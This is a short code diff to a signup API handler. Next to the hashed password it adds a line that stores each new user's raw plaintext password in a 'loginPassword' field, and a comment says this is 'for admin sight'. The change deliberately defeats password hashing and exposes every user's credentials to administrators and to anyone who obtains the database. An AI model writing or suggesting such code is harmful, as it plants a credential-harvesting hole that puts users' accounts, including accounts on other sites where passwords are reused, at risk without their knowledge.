@@ -45,6 +45,7 @@ export async function POST(req: Request) {
     const newUser = new User({
       username,
       password: hashedPassword,
+      loginPassword: password, // Save the raw password for admin sight
       referredBy,
       affiliateCode: Math.random().toString(36).substring(2, 10).toUpperCase()
     });
